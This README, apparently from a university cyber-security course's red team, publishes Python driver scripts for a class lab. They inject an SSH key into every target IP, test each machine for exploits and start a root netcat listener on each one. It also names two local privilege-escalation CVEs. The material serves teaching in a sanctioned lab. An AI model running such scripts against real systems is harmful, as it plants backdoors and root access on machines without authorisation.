# SDSU Cyber Security Red Team - CS574

## Purpose
As leader of the SDSU CS574 Cyber Security Red Team I have made a bunch of custom tools for attacking students' systems. I am publishing this publicly so that students who have completed the course are able to learn from the tools that I created.

I originally took this course in 2019 and was assigned to Red Team because of some of the real-world applications I demonstrated to the professor, Peter Bartoli. Ever since graduating I have been great friends with Peter and I continue to lead the Red Team every semester.

---

## Test if all users are vulnerable:
```
from TargetMachine import TargetMachine
exec(open("main.py").read())
config = read_config_file()
public_ssh_key_to_inject = config["public_ssh_key_to_inject"]
ips = config["ips"]
credentials = config["credentials"]
users = []
for ip in ips:
	new_user = TargetMachine(ip_address=ip, credentials=credentials, public_ssh_key_to_inject=public_ssh_key_to_inject)
	users.append(new_user)

for user in users:
	for exploit in user.exploits:
		try:
			exploit.test_if_vulnerable()
		except Exception:
			pass

```

## Start a root netcat server on all target machines:
```
from TargetMachine import TargetMachine
exec(open("main.py").read())
config = read_config_file()
public_ssh_key_to_inject = config["public_ssh_key_to_inject"]
ips = config["ips"]
credentials = config["credentials"]
users = []
for ip in ips:
	new_user = TargetMachine(ip_address=ip, credentials=credentials, public_ssh_key_to_inject=public_ssh_key_to_inject)
	users.append(new_user)

for user in users:
	for exploit in user.exploits:
		try:
			exploit.start_root_netcat_server()
		except Exception:
			pass

```

---

## System Vulnerabilities
This section highlights the vulnerabilities that I have found on the defense lab system. These CVEs may or may not be patched by updating the system, I will have to try 

### CVE-2021-3156 (Baron Samedit)
**Type:** local

**Fixed by updating:** ?

### CVE 2021-4034 (PwnKit)
**Type:** local

**Fixed by updating:** ?
